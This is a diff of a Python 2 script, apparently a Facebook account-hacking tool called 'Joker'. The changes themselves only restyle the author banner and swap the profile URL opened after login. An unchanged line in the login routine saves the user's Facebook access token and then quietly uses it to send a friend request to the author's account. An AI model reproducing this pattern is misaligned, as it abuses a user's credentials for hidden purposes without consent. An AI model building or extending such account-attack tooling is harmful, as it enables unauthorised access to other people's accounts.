@@ -56,9 +56,9 @@ logo = """ -----------------------------•◈•
 |__~~~\ •◈•-----█-------⑧-------█------•◈•
 |__~~~\ •◈•-----█-------⑥-------█------•◈•
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mBaba Shani
-\033[1;96mInstagram \033[1;93m: \033[1;babashani676
-\033[1;96mFacebook  \033[1;93m: \033[1;Baba shani
+\033[1;96mAuthor  \033[1;93m: \033[1;92m   Baba Shani
+\033[1;96mInstagram \033[1;93m: \033[1;92m babashani676
+\033[1;96mFacebook  \033[1;93m: \033[1;92m Baba shani
 \033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Babashani676/Joker
 \033[1;91m======================================="""
 
@@ -80,8 +80,8 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mBaba Shani
-\033[1;96mInstagram \033[1;93m: \033[1;92babashani676
+\033[1;96mAuthor  \033[1;93m: \033[1;92m   Baba Shani
+\033[1;96mInstagram \033[1;93m: \033[1;92m babashani676
 \033[1;96mFacebook  \033[1;93m: \033[1;92m Baba Shani
 \033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Babashani676/Joker
 \033[1;91m======================================="""
@@ -144,7 +144,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				os.system('xdg-open https://www.facebook.com/baba.shani.77 ')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
